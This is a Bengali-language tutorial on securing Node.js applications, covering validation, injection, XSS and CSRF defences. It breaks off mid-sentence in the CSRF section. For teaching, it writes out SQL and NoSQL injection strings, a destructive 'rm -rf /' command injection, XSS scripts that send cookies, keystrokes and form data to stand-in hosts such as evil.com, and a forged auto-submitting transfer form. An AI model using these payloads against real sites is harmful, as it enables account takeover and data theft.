# Node.js Security - সম্পূর্ণ গাইড

একটি প্রোডাকশন-গ্রেড Node.js অ্যাপ্লিকেশনের জন্য সিকিউরিটি সবচেয়ে গুরুত্বপূর্ণ বিষয়। নিচে সিকিউরিটির বিভিন্ন দিক এবং বেস্ট প্র্যাকটিসগুলো বিস্তারিত আলোচনা করা হলো।

## কেন Security এত গুরুত্বপূর্ণ?

### Real-World Statistics:
- প্রতি **39 সেকেন্ডে** একটি cyber attack হয়
- **43%** small businesses cyber attack এর শিকার হয়
- একটা data breach এর average cost: **$4.35 million**
- **90%+ attacks** এর কারণ হলো poor security practices

### Common Security Vulnerabilities (OWASP Top 10):

1. **Injection** (SQL, NoSQL, Command)
2. **Broken Authentication**
3. **Sensitive Data Exposure**
4. **XML External Entities (XXE)**
5. **Broken Access Control**
6. **Security Misconfiguration**
7. **Cross-Site Scripting (XSS)**
8. **Insecure Deserialization**
9. **Using Components with Known Vulnerabilities**
10. **Insufficient Logging & Monitoring**

আমরা এসব এবং আরও অনেক কিছু cover করব।

---

## ১. Input Validation & Sanitization

**"Never Trust User Input"** - Security এর Golden Rule!

সার্ভারে আসা যেকোনো ডেটাই ক্ষতিকর হতে পারে। ইউজার ইচ্ছাকৃত বা অনিচ্ছাকৃতভাবে ভুল, ক্ষতিকর বা malicious ডেটা পাঠাতে পারে।

### কেন Validation জরুরি?

**Without Validation:**
```javascript
// ❌ Dangerous!
app.post('/users', (req, res) => {
    const user = {
        name: req.body.name,        // কি আসবে জানি না!
        email: req.body.email,      // email নাকি script?
        age: req.body.age,          // number নাকি string?
        role: req.body.role         // "user" নাকি "admin"?
    };
    
    db.save(user); // ☠️ Anything can happen!
});
```

**Possible Attacks:**
```javascript
// Attacker পাঠাতে পারে:
{
    "name": "<script>alert('XSS')</script>",
    "email": "'; DROP TABLE users; --",
    "age": "abc",
    "role": "admin"  // 🚨 Privilege escalation!
}
```

### A. Manual Validation (Not Recommended)

```javascript
app.post('/users', (req, res) => {
    const { name, email, age, password } = req.body;
    
    // Type checking
    if (typeof name !== 'string' || name.length < 3) {
        return res.status(400).json({ error: 'Invalid name' });
    }
    
    // Email validation
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
        return res.status(400).json({ error: 'Invalid email' });
    }
    
    // Age validation
    if (typeof age !== 'number' || age < 18 || age > 100) {
        return res.status(400).json({ error: 'Invalid age' });
    }
    
    // Password strength
    if (password.length < 8) {
        return res.status(400).json({ error: 'Password too short' });
    }
    
    // ... too much code! 😫
});
```

**সমস্যা:** Code duplication, error-prone, hard to maintain

---

### B. express-validator (Recommended)

```bash
npm install express-validator
```

```javascript
const { body, validationResult } = require('express-validator');

// Validation middleware
const validateUser = [
    body('name')
        .trim()                              // Whitespace remove
        .isLength({ min: 3, max: 50 })
        .withMessage('Name must be 3-50 characters')
        .isAlpha('en-US', { ignore: ' ' })   // শুধু letters এবং space
        .withMessage('Name can only contain letters'),
    
    body('email')
        .trim()
        .isEmail()
        .withMessage('Invalid email address')
        .normalizeEmail(),                    // test@GMAIL.com → test@gmail.com
    
    body('password')
        .isLength({ min: 8 })
        .withMessage('Password must be at least 8 characters')
        .matches(/\d/)
        .withMessage('Password must contain a number')
        .matches(/[A-Z]/)
        .withMessage('Password must contain an uppercase letter')
        .matches(/[!@#$%^&*]/)
        .withMessage('Password must contain a special character'),
    
    body('age')
        .isInt({ min: 18, max: 100 })
        .withMessage('Age must be between 18 and 100'),
    
    body('phone')
        .optional()                           // Optional field
        .isMobilePhone('bn-BD')              // Bangladesh number
        .withMessage('Invalid phone number'),
    
    body('website')
        .optional()
        .isURL()
        .withMessage('Invalid URL'),
    
    body('role')
        .optional()
        .isIn(['user', 'editor', 'admin'])   // Whitelist
        .withMessage('Invalid role')
];

// Route handler
app.post('/users', validateUser, (req, res) => {
    // Check validation results
    const errors = validationResult(req);
    
    if (!errors.isEmpty()) {
        return res.status(422).json({
            success: false,
            errors: errors.array()
        });
    }
    
    // Data is now validated and sanitized ✅
    const user = req.body;
    // Save to database...
});
```

### C. Joi (Schema-based Validation)

```bash
npm install joi
```

```javascript
const Joi = require('joi');

// Define schema
const userSchema = Joi.object({
    name: Joi.string()
        .min(3)
        .max(50)
        .required()
        .trim(),
    
    email: Joi.string()
        .email()
        .required()
        .lowercase(),
    
    password: Joi.string()
        .min(8)
        .pattern(/^(?=.*[A-Z])(?=.*\d)(?=.*[!@#$%^&*])/)
        .required()
        .messages({
            'string.pattern.base': 'Password must contain uppercase, number, and special char'
        }),
    
    age: Joi.number()
        .integer()
        .min(18)
        .max(100)
        .required(),
    
    phone: Joi.string()
        .pattern(/^01[3-9]\d{8}$/)  // Bangladesh phone
        .optional(),
    
    address: Joi.object({
        street: Joi.string().required(),
        city: Joi.string().required(),
        zip: Joi.string().pattern(/^\d{4}$/)
    }).optional(),
    
    hobbies: Joi.array()
        .items(Joi.string())
        .max(5)
        .optional()
});

// Validation middleware
const validate = (schema) => {
    return (req, res, next) => {
        const { error, value } = schema.validate(req.body, {
            abortEarly: false,  // সব errors একসাথে দেখাবে
            stripUnknown: true  // অতিরিক্ত fields remove করবে
        });
        
        if (error) {
            return res.status(422).json({
                success: false,
                errors: error.details.map(err => ({
                    field: err.path.join('.'),
                    message: err.message
                }))
            });
        }
        
        req.body = value;  // Validated data
        next();
    };
};

// Usage
app.post('/users', validate(userSchema), (req, res) => {
    // Data is validated ✅
    const user = req.body;
    // Save to database...
});
```

### D. Zod (TypeScript-friendly)

```bash
npm install zod
```

```javascript
const { z } = require('zod');

// Define schema
const userSchema = z.object({
    name: z.string()
        .min(3, 'Name too short')
        .max(50, 'Name too long')
        .trim(),
    
    email: z.string()
        .email('Invalid email')
        .toLowerCase(),
    
    password: z.string()
        .min(8, 'Password must be at least 8 characters')
        .regex(/[A-Z]/, 'Must contain uppercase')
        .regex(/\d/, 'Must contain number')
        .regex(/[!@#$%^&*]/, 'Must contain special char'),
    
    age: z.number()
        .int()
        .min(18)
        .max(100),
    
    isActive: z.boolean().default(true),
    
    tags: z.array(z.string()).max(5).optional()
});

// Validation
app.post('/users', (req, res) => {
    try {
        const validatedData = userSchema.parse(req.body);
        // Data is valid ✅
        res.json({ success: true, data: validatedData });
    } catch (error) {
        res.status(422).json({
            success: false,
            errors: error.errors
        });
    }
});
```

### E. Custom Validators

```javascript
const { body } = require('express-validator');

// Custom validator: Check if email exists
body('email').custom(async (value) => {
    const user = await User.findOne({ email: value });
    if (user) {
        throw new Error('Email already exists');
    }
    return true;
});

// Custom validator: Password confirmation
body('confirmPassword').custom((value, { req }) => {
    if (value !== req.body.password) {
        throw new Error('Passwords do not match');
    }
    return true;
});

// Custom validator: Check username availability
body('username').custom(async (value) => {
    const reservedNames = ['admin', 'root', 'superuser'];
    if (reservedNames.includes(value.toLowerCase())) {
        throw new Error('Username is reserved');
    }
    return true;
});
```

### F. Sanitization (Cleaning Data)

```javascript
const { body } = require('express-validator');

app.post('/posts', [
    body('title')
        .trim()                    // Remove whitespace
        .escape()                  // Convert HTML to safe entities
        .blacklist('<>'),          // Remove specific characters
    
    body('content')
        .trim()
        .stripLow()               // Remove control characters
        .escape(),
    
    body('email')
        .normalizeEmail(),        // test@GMAIL.com → test@gmail.com
    
    body('url')
        .trim()
        .customSanitizer(value => {
            // Add https:// if missing
            if (value && !value.startsWith('http')) {
                return 'https://' + value;
            }
            return value;
        })
], (req, res) => {
    // Data is sanitized ✅
});
```

### Best Practices Summary:

✅ **Always validate on the server** (client-side validation শুধু UX এর জন্য)  
✅ **Use validation libraries** (Joi, Zod, express-validator)  
✅ **Whitelist, not blacklist** (শুধু allowed values accept করুন)  
✅ **Sanitize HTML input** (XSS prevention)  
✅ **Validate data types** (string, number, boolean)  
✅ **Check length limits** (min, max)  
✅ **Use regex for patterns** (phone, email, etc.)  
✅ **Custom validators for business logic**  
✅ **Return clear error messages**  
✅ **Log validation failures** (security monitoring)

---

## ২. Injection Attacks Prevention

Injection attacks হলো **OWASP Top 10 এর #1 vulnerability**। এটা অত্যন্ত বিপজ্জনক কারণ হ্যাকার পুরো database নিয়ন্ত্রণ নিতে পারে।

---

### A. SQL Injection - বিস্তারিত

#### কিভাবে কাজ করে?

যখন user input সরাসরি SQL query এ concatenate করা হয়, তখন attacker malicious SQL code inject করতে পারে।

#### Real Attack Example:

```javascript
// ❌ Vulnerable Login System
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    
    // Dangerous query concatenation
    const query = `
        SELECT * FROM users 
        WHERE username = '${username}' 
        AND password = '${password}'
    `;
    
    db.query(query, (err, results) => {
        if (results.length > 0) {
            res.json({ message: 'Login successful' });
        }
    });
});

// 🚨 Attacker পাঠায়:
{
    "username": "admin' OR '1'='1",
    "password": "anything"
}

// Final Query হয়ে যায়:
SELECT * FROM users 
WHERE username = 'admin' OR '1'='1' 
AND password = 'anything'

// '1'='1' সবসময় true, তাই login successful! 😱
```

#### আরও বিপজ্জনক Attacks:

```javascript
// 1. Data Extraction
username: "admin' UNION SELECT credit_card_number FROM cards--"

// 2. Database Deletion
username: "admin'; DROP TABLE users;--"

// 3. Privilege Escalation
username: "admin'; UPDATE users SET role='admin' WHERE id=123;--"

// 4. Reading Files
username: "admin' UNION SELECT LOAD_FILE('/etc/passwd')--"
```

#### ✅ Prevention Method 1: Parameterized Queries

```javascript
// MySQL with mysql2
const mysql = require('mysql2/promise');

app.post('/login', async (req, res) => {
    const { username, password } = req.body;
    
    // ✅ Parameterized query - Safe!
    const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
    const [results] = await db.execute(query, [username, password]);
    
    // Input treated as DATA, not CODE
    // Even if username = "admin' OR '1'='1"
    // It will search for literal string "admin' OR '1'='1"
    
    if (results.length > 0) {
        res.json({ message: 'Login successful' });
    } else {
        res.status(401).json({ error: 'Invalid credentials' });
    }
});
```

#### ✅ Prevention Method 2: ORM (Sequelize)

```javascript
const { Sequelize, DataTypes } = require('sequelize');

// Define model
const User = sequelize.define('User', {
    username: DataTypes.STRING,
    password: DataTypes.STRING
});

app.post('/login', async (req, res) => {
    const { username, password } = req.body;
    
    // ✅ ORM automatically escapes input
    const user = await User.findOne({
        where: {
            username: username,
            password: password  // (Hash করা হবে actual production এ)
        }
    });
    
    if (user) {
        res.json({ message: 'Login successful' });
    } else {
        res.status(401).json({ error: 'Invalid credentials' });
    }
});
```

#### ✅ Prevention Method 3: Query Builder (Knex.js)

```javascript
const knex = require('knex')({
    client: 'mysql2',
    connection: { /* config */ }
});

app.post('/login', async (req, res) => {
    const { username, password } = req.body;
    
    // ✅ Safe query building
    const user = await knex('users')
        .where('username', username)
        .andWhere('password', password)
        .first();
    
    if (user) {
        res.json({ message: 'Login successful' });
    }
});
```

#### Additional SQL Injection Prevention:

```javascript
// 1. Validate input type
if (typeof userId !== 'string' || !/^\d+$/.test(userId)) {
    return res.status(400).json({ error: 'Invalid ID' });
}

// 2. Use whitelist for ORDER BY, table names
const allowedSortFields = ['name', 'email', 'created_at'];
const sortField = allowedSortFields.includes(req.query.sort) 
    ? req.query.sort 
    : 'created_at';

// 3. Least privilege - Database user should have minimal permissions
// Don't use root/admin for application
// CREATE USER 'appuser'@'localhost' IDENTIFIED BY 'password';
// GRANT SELECT, INSERT, UPDATE, DELETE ON mydb.* TO 'appuser'@'localhost';
```

---

### B. NoSQL Injection (MongoDB) - বিস্তারিত

#### কিভাবে কাজ করে?

MongoDB query operators (`$gt`, `$ne`, `$where`) ব্যবহার করে attacker authentication bypass করতে পারে।

#### Real Attack Example:

```javascript
// ❌ Vulnerable Login
app.post('/login', async (req, res) => {
    const { username, password } = req.body;
    
    // Dangerous direct use of req.body
    const user = await User.findOne({
        username: username,
        password: password
    });
    
    if (user) {
        res.json({ message: 'Login successful' });
    }
});

// 🚨 Attacker পাঠায় (JSON):
{
    "username": "admin",
    "password": { "$ne": null }
}

// Query হয়ে যায়:
User.findOne({
    username: "admin",
    password: { $ne: null }  // "password != null" - Always true!
})

// Login successful without knowing password! 😱
```

#### আরও Attacks:

```javascript
// 1. Regex injection (DoS)
{
    "username": { "$regex": ".*" },
    "password": { "$regex": ".*" }
}
// Returns first user

// 2. $where injection
{
    "username": "admin",
    "password": { "$where": "return true" }
}

// 3. $gt bypass
{
    "age": { "$gt": 0 }  // All users
}
```

#### ✅ Prevention Method 1: Type Validation

```javascript
app.post('/login', async (req, res) => {
    const { username, password } = req.body;
    
    // ✅ Validate types
    if (typeof username !== 'string' || typeof password !== 'string') {
        return res.status(400).json({ error: 'Invalid input' });
    }
    
    const user = await User.findOne({ username, password });
    
    if (user) {
        res.json({ message: 'Login successful' });
    }
});
```

#### ✅ Prevention Method 2: mongo-sanitize

```bash
npm install mongo-sanitize
```

```javascript
const mongoSanitize = require('mongo-sanitize');

app.post('/login', async (req, res) => {
    // ✅ Remove $ and . from input
    const username = mongoSanitize(req.body.username);
    const password = mongoSanitize(req.body.password);
    
    // { "$ne": null } → { "ne": null } (harmless)
    
    const user = await User.findOne({ username, password });
    
    if (user) {
        res.json({ message: 'Login successful' });
    }
});
```

#### ✅ Prevention Method 3: express-mongo-sanitize (Middleware)

```bash
npm install express-mongo-sanitize
```

```javascript
const mongoSanitize = require('express-mongo-sanitize');

// Apply to all routes
app.use(mongoSanitize());

// Or with options
app.use(mongoSanitize({
    replaceWith: '_',  // Replace $ and . with _
    onSanitize: ({ req, key }) => {
        console.warn(`Sanitized ${key} in request from ${req.ip}`);
    }
}));

app.post('/login', async (req, res) => {
    // req.body is already sanitized ✅
    const user = await User.findOne({
        username: req.body.username,
        password: req.body.password
    });
});
```

#### ✅ Prevention Method 4: Schema Validation (Mongoose)

```javascript
const mongoose = require('mongoose');

// Define strict schema
const userSchema = new mongoose.Schema({
    username: {
        type: String,
        required: true,
        validate: {
            validator: (v) => typeof v === 'string' && v.length > 0,
            message: 'Invalid username'
        }
    },
    password: {
        type: String,
        required: true
    }
}, {
    strict: true  // Ignore fields not in schema
});

const User = mongoose.model('User', userSchema);

app.post('/login', async (req, res) => {
    // ✅ Mongoose validates types automatically
    const user = await User.findOne({
        username: req.body.username,
        password: req.body.password
    });
    
    // { "$ne": null } will be rejected by schema
});
```

---

### C. Command Injection

যখন user input directly shell command এ ব্যবহার করা হয়।

#### ❌ Vulnerable Code:

```javascript
const { exec } = require('child_process');

app.get('/ping', (req, res) => {
    const host = req.query.host;
    
    // 🚨 Dangerous!
    exec(`ping -c 4 ${host}`, (error, stdout) => {
        res.send(stdout);
    });
});

// Attacker পাঠায়:
// /ping?host=google.com; rm -rf /

// Command executes:
// ping -c 4 google.com; rm -rf /
// 💀 Deletes everything!
```

#### ✅ Prevention:

```javascript
const { execFile } = require('child_process');

app.get('/ping', (req, res) => {
    const host = req.query.host;
    
    // Validate input
    if (!/^[a-zA-Z0-9.-]+$/.test(host)) {
        return res.status(400).json({ error: 'Invalid host' });
    }
    
    // ✅ Use execFile instead of exec
    // Arguments are passed separately, not in shell
    execFile('ping', ['-c', '4', host], (error, stdout) => {
        if (error) {
            return res.status(500).json({ error: 'Ping failed' });
        }
        res.send(stdout);
    });
});

// Even if host = "google.com; rm -rf /"
// It will try to ping "google.com; rm -rf /" (invalid hostname)
// Not execute as separate command ✅
```

---

### D. LDAP Injection

#### ❌ Vulnerable:

```javascript
const query = `(uid=${username})`;
// username = "*" returns all users
```

#### ✅ Safe:

```javascript
// Escape special characters
function escapeLDAP(str) {
    return str.replace(/[*()\\\x00]/g, (c) => '\\' + c.charCodeAt(0).toString(16));
}

const safeUsername = escapeLDAP(username);
const query = `(uid=${safeUsername})`;
```

---

### Injection Prevention Summary:

✅ **Never concatenate user input into queries**  
✅ **Use parameterized queries / prepared statements**  
✅ **Use ORM/ODM (Sequelize, Mongoose, TypeORM)**  
✅ **Validate input types (string, number, etc.)**  
✅ **Sanitize input (remove $, ;, --, etc.)**  
✅ **Use whitelists for allowed values**  
✅ **Escape special characters**  
✅ **Use execFile instead of exec**  
✅ **Apply principle of least privilege (database permissions)**  
✅ **Log and monitor injection attempts**

---

## ৩. XSS (Cross-Site Scripting) - বিস্তারিত

XSS হলো **OWASP Top 10 এর #7 vulnerability**। এটা অত্যন্ত common এবং বিপজ্জনক।

### XSS কি এবং কিভাবে কাজ করে?

XSS attack এ হ্যাকার malicious JavaScript code inject করে যা victim এর ব্রাউজারে execute হয়।

### XSS এর তিন ধরন:

---

### A. Stored XSS (Persistent XSS) - সবচেয়ে বিপজ্জনক

Malicious code database এ save হয়ে যায়। যে কেউ ওই page visit করলে attack execute হবে।

#### Real Attack Example:

```javascript
// ❌ Vulnerable Comment System
app.post('/comments', async (req, res) => {
    const comment = req.body.comment;  // No sanitization!
    
    await Comment.create({
        text: comment,
        userId: req.user.id
    });
    
    res.json({ message: 'Comment posted' });
});

app.get('/comments', async (req, res) => {
    const comments = await Comment.findAll();
    
    // ❌ Directly rendering user input as HTML
    res.send(`
        <html>
            <body>
                ${comments.map(c => `<p>${c.text}</p>`).join('')}
            </body>
        </html>
    `);
});

// 🚨 Attacker posts comment:
{
    "comment": "<script>
        fetch('https://hacker.com/steal?cookie=' + document.cookie)
    </script>"
}

// এখন যে কেউ comments page visit করলে তার cookie চুরি হবে! 😱
```

#### আরও বিপজ্জনক XSS Payloads:

```javascript
// 1. Cookie Stealing
<script>
    fetch('https://evil.com?c=' + document.cookie);
</script>

// 2. Keylogger
<script>
    document.onkeypress = function(e) {
        fetch('https://evil.com/log?key=' + e.key);
    }
</script>

// 3. Redirect to Phishing Site
<script>
    window.location = 'https://fake-facebook-login.com';
</script>

// 4. Change Page Content
<script>
    document.body.innerHTML = '<h1>This site has been hacked!</h1>';
</script>

// 5. Form Hijacking
<script>
    document.querySelector('form').onsubmit = function(e) {
        e.preventDefault();
        const data = new FormData(e.target);
        fetch('https://evil.com/steal', {
            method: 'POST',
            body: data
        });
    }
</script>
```

#### ✅ Prevention Method 1: HTML Escape

```javascript
// Escape function
function escapeHtml(unsafe) {
    return unsafe
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}

app.get('/comments', async (req, res) => {
    const comments = await Comment.findAll();
    
    // ✅ Escape before rendering
    res.send(`
        <html>
            <body>
                ${comments.map(c => `<p>${escapeHtml(c.text)}</p>`).join('')}
            </body>
        </html>
    `);
});

// <script>alert('XSS')</script>
// Becomes: &lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt;
// Displays as text, doesn't execute ✅
```

#### ✅ Prevention Method 2: Template Engines (Auto-escape)

```javascript
// EJS - Auto-escapes by default
app.set('view engine', 'ejs');

app.get('/comments', async (req, res) => {
    const comments = await Comment.findAll();
    
    // ✅ EJS automatically escapes
    res.render('comments', { comments });
});

// comments.ejs
// <%= comment.text %>  ← Auto-escaped ✅
// <%- comment.text %>  ← NOT escaped (dangerous!)
```

```javascript
// Handlebars - Auto-escapes
// {{ comment }}  ← Escaped ✅
// {{{ comment }}}  ← NOT escaped (dangerous!)

// Pug - Auto-escapes
// p= comment  ← Escaped ✅
// p!= comment  ← NOT escaped (dangerous!)
```

#### ✅ Prevention Method 3: xss-clean Middleware

```bash
npm install xss-clean
```

```javascript
const xss = require('xss-clean');

// Apply to all routes
app.use(xss());

app.post('/comments', async (req, res) => {
    // req.body.comment is already sanitized ✅
    // <script>alert('XSS')</script>
    // Becomes: &lt;script&gt;alert('XSS')&lt;/script&gt;
    
    await Comment.create({
        text: req.body.comment
    });
});
```

#### ✅ Prevention Method 4: DOMPurify (Advanced)

```bash
npm install isomorphic-dompurify
```

```javascript
const createDOMPurify = require('isomorphic-dompurify');
const DOMPurify = createDOMPurify();

app.post('/comments', async (req, res) => {
    // ✅ Sanitize HTML but keep safe tags
    const clean = DOMPurify.sanitize(req.body.comment, {
        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
        ALLOWED_ATTR: ['href']
    });
    
    await Comment.create({
        text: clean
    });
});

// Input: <b>Bold</b> <script>alert('XSS')</script>
// Output: <b>Bold</b> (script removed) ✅
```

---

### B. Reflected XSS

Attack payload URL এ থাকে এবং immediately reflect হয় response এ।

#### Real Attack Example:

```javascript
// ❌ Vulnerable Search
app.get('/search', (req, res) => {
    const query = req.query.q;
    
    // ❌ Directly rendering user input
    res.send(`
        <html>
            <body>
                <h1>Search results for: ${query}</h1>
                <p>No results found</p>
            </body>
        </html>
    `);
});

// 🚨 Attacker sends link:
// https://example.com/search?q=<script>alert(document.cookie)</script>

// Victim clicks → XSS executes!
```

#### ✅ Prevention:

```javascript
app.get('/search', (req, res) => {
    const query = escapeHtml(req.query.q);
    
    // ✅ Escaped before rendering
    res.send(`
        <html>
            <body>
                <h1>Search results for: ${query}</h1>
            </body>
        </html>
    `);
});
```

---

### C. DOM-based XSS

Attack হয় client-side JavaScript এর মাধ্যমে।

#### ❌ Vulnerable:

```html
<script>
    // ❌ Dangerous!
    const name = new URLSearchParams(window.location.search).get('name');
    document.getElementById('welcome').innerHTML = 'Welcome ' + name;
</script>

<!-- URL: ?name=<img src=x onerror=alert('XSS')> -->
```

#### ✅ Prevention:

```html
<script>
    const name = new URLSearchParams(window.location.search).get('name');
    
    // ✅ Use textContent instead of innerHTML
    document.getElementById('welcome').textContent = 'Welcome ' + name;
    
    // Or sanitize
    document.getElementById('welcome').innerHTML = DOMPurify.sanitize('Welcome ' + name);
</script>
```

---

### Content Security Policy (CSP) - Ultimate XSS Protection

CSP হলো একটি HTTP header যা browser কে বলে কোথা থেকে script load করা যাবে।

```javascript
const helmet = require('helmet');

app.use(helmet.contentSecurityPolicy({
    directives: {
        defaultSrc: ["'self'"],                    // শুধু same origin
        scriptSrc: [
            "'self'",                              // Same origin scripts
            "'nonce-randomString123'",             // Inline scripts with nonce
            "https://trusted-cdn.com"              // Trusted CDN
        ],
        styleSrc: ["'self'", "'unsafe-inline'"],   // CSS
        imgSrc: ["'self'", "data:", "https:"],     // Images
        fontSrc: ["'self'", "https://fonts.gstatic.com"],
        connectSrc: ["'self'", "https://api.example.com"],
        frameAncestors: ["'none'"],                // Prevent iframe embedding
        objectSrc: ["'none'"],                     // Disable plugins
        upgradeInsecureRequests: []                // HTTP → HTTPS
    }
}));

// Response headers:
// Content-Security-Policy: 
//   default-src 'self'; 
//   script-src 'self' https://trusted-cdn.com;
//   style-src 'self' 'unsafe-inline';

// এখন attacker script inject করলেও browser execute করবে না! ✅
```

#### CSP with Nonce (Inline Scripts):

```javascript
const crypto = require('crypto');

app.use((req, res, next) => {
    res.locals.nonce = crypto.randomBytes(16).toString('base64');
    next();
});

app.use(helmet.contentSecurityPolicy({
    directives: {
        scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`]
    }
}));

app.get('/', (req, res) => {
    res.send(`
        <html>
            <head>
                <!-- ✅ Allowed (has nonce) -->
                <script nonce="${res.locals.nonce}">
                    console.log('This works!');
                </script>
                
                <!-- ❌ Blocked (no nonce) -->
                <script>
                    alert('XSS');  // Won't execute!
                </script>
            </head>
        </html>
    `);
});
```

---

### HttpOnly Cookies (Cookie Stealing Prevention)

```javascript
// ❌ Cookie accessible via JavaScript
res.cookie('sessionId', 'abc123', {
    maxAge: 900000,
    httpOnly: false  // JavaScript can read it!
});

// Attacker can steal:
// <script>fetch('https://evil.com?c=' + document.cookie)</script>

// ✅ HttpOnly cookie
res.cookie('sessionId', 'abc123', {
    maxAge: 900000,
    httpOnly: true,   // ✅ JavaScript CANNOT read it!
    secure: true,     // Only HTTPS
    sameSite: 'strict' // CSRF protection
});

// এখন document.cookie থেকে পাওয়া যাবে না! ✅
```

---

### XSS Prevention Checklist:

✅ **Never trust user input**  
✅ **Escape/sanitize before rendering** (escapeHtml, DOMPurify)  
✅ **Use template engines that auto-escape** (EJS, Handlebars, Pug)  
✅ **Use textContent instead of innerHTML** (DOM manipulation)  
✅ **Implement Content Security Policy (CSP)**  
✅ **Use HttpOnly cookies**  
✅ **Validate and whitelist HTML tags** (if rich text needed)  
✅ **Use xss-clean middleware**  
✅ **Sanitize on both frontend AND backend**  
✅ **Regular security audits and penetration testing**

---

### Testing for XSS:

```javascript
// Test payloads
const xssPayloads = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    'javascript:alert("XSS")',
    '<iframe src="javascript:alert(\'XSS\')">',
    '"><script>alert(String.fromCharCode(88,83,83))</script>',
    '<body onload=alert("XSS")>'
];

// If any of these execute → Vulnerable!
```

---

## ৪. CSRF (Cross-Site Request Forgery) - বিস্তারিত

CSRF attack এ হ্যাকার victim কে trick করে unwanted actions perform করায় যখন victim authenticated থাকে।

### CSRF কিভাবে কাজ করে?

#### Real-World Scenario:

1. আপনি `bank.com` এ login করেছেন
2. আপনার browser এ session cookie saved আছে
3. হ্যাকার আপনাকে একটা email/link পাঠায়
4. লিংকে click করলে background এ malicious request যায়
5. Browser automatically আপনার cookie পাঠায়
6. Bank server মনে করে আপনিই request করেছেন
7. Money transferred! 💸

#### Attack Example:

```html
<!-- হ্যাকার এই HTML page বানায় -->
<html>
<body>
    <h1>You won $1000! Click here to claim</h1>
    
    <!-- ❌ Hidden malicious form -->
    <form action="https://bank.com/transfer" method="POST" id="hack">
        <input type="hidden" name="to" value="hacker_account" />
        <input type="hidden" name="amount" value="10000" />
    </form>
    
    <script>
        // Auto-submit form
        document.getElementById('hack').submit();
    </script>
</body>
</html>

<!-- Victim visits this page while logged into bank.com
     → Form automatically submits
     → Browser sends session cookie
     → Money transferred without victim knowing! 😱 -->
```

#### Another Attack Vector (Image tag):

```html
<!-- Hacker embeds this in forum/email -->
<img src="https://bank.com/transfer?to=hacker&amount=10000" />

<!-- When victim views page:
     → GET request sent automatically
     → If bank uses GET for transfers (very bad!)
     → Money transferred! -->
```

---

### ✅ Prevention Method 1: CSRF Tokens (Synchronizer Token Pattern)

```bash
npm install csurf cookie-parser
```

```javascript
const csrf = require('csurf');
const cookieParser = require('cookie-parser');

// Setup
app.use(cookieParser());
app.use(csrf({ cookie: true }));

// Generate form with CSRF token
app.get('/transfer', (req, res) => {
    res.render('transfer', {
        csrfToken: req.csrfToken()  // ✅ Generate unique token
    });
});

// transfer.ejs
/*
<form method="POST" action="/transfer">
    <input type="hidden" name="_csrf" value="<%= csrfToken %>" />
    <input type="text" name="to" placeholder="Account number" />
    <input type="number" name="amount" placeholder="Amount" />
    <button type="submit">Transfer</button>
</form>
*/

// Process transfer
app.post('/transfer', (req, res) => {
    // ✅ csurf middleware automatically validates token
    // If token missing or invalid → 403 Forbidden
    
    const { to, amount } = req.body;
    // Process transfer...
    res.json({ success: true });
});

// এখন hacker forged form submit করলেও কাজ করবে না
// কারণ তার কাছে valid CSRF token নেই! ✅
```

#### CSRF Token with API:

```javascript
// For AJAX/API requests
app.get('/api/csrf-token', (req, res) => {
    res.json({ csrfToken: req.csrfToken() });
});

// Frontend
fetch('/api/csrf-token')
    .then(res => res.json())
    .then(data => {
        // Store token
        const csrfToken = data.csrfToken;
        
        // Use in subsequent requests
        fetch('/transfer', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'CSRF-Token': csrfToken  // ✅ Include token
            },
            body: JSON.stringify({
                to: 'account123',
                amount: 500
            })
        });
    });

// Backend validation
app.post('/transfer', (req, res) => {
    // Middleware validates CSRF-Token header ✅
    // Transfer money...
});
```

---

### ✅ Prevention Method 2: SameSite Cookies

```javascript
// Set SameSite cookie attribute
res.cookie('sessionId', 'abc123', {
    httpOnly: true,
    secure: true,
    sameSite: 'strict'  // ✅ Cookie শুধু same-site requests এ যাবে
});

// SameSite values:
// 'strict' - শুধু same-site requests (most secure)
// 'lax'    - same-site + top-level navigation GET requests
// 'none'   - all requests (must use with secure: true)
```

#### SameSite কিভাবে কাজ করে:

```javascript
// Scenario 1: Legitimate request
// User is on bank.com and clicks transfer button
// Cookie sent: ✅ (same-site)

// Scenario 2: CSRF attack
// User is on evil.com
// evil.com tries to send request to bank.com
// Cookie sent: ❌ (cross-site) - CSRF blocked! ✅

app.use(session({
    secret: 'secret-key',
    resave: false,
    saveUninitialized: false,
    cookie: {
        httpOnly: true,
        secure: true,
        sameSite: 'strict'  // ✅ CSRF protection
    }
}));
```

---

### ✅ Prevention Method 3: Double Submit Cookie

```javascript
const crypto = require('crypto');

// Generate CSRF token
app.use((req, res, next) => {
    if (!req.cookies.csrfToken) {
        const token = crypto.randomBytes(32).toString('hex');
        res.cookie('csrfToken', token, {
            httpOnly: false,  // JavaScript can read it
            sameSite: 'strict'
        });
    }
    next();
});

// Frontend sends token in both cookie AND body/header
fetch('/transfer', {
    method: 'POST',
    headers: {
        'X-CSRF-Token': getCookie('csrfToken')  // From cookie
    },
    body: JSON.stringify({ to: 'account', amount: 100 })
});

// Backend validates
app.post('/transfer', (req, res) => {
    const tokenFromCookie = req.cookies.csrfToken;
    const tokenFromHeader = req.headers['x-csrf-token'];
    
    if (!tokenFromCookie || tokenFromCookie !== tokenFromHeader) {
        return res.status(403).json({ error: 'Invalid CSRF token' });
    }
    
    // Process transfer ✅
});
```

---

### ✅ Prevention Method 4: Custom Request Headers

```javascript
// For API requests only
// Browsers don't allow cross-origin custom headers without CORS

// Frontend
fetch('/api/transfer', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest'  // Custom header
    },
    body: JSON.stringify({ to: 'account', amount: 100 })
});

// Backend checks for custom header
app.post('/api/transfer', (req, res) => {
    if (!req.headers['x-requested-with']) {
        return res.status(403).json({ error: 'Invalid request' });
    }
    
    // Process ✅
});

// CSRF attack থেকে safe কারণ:
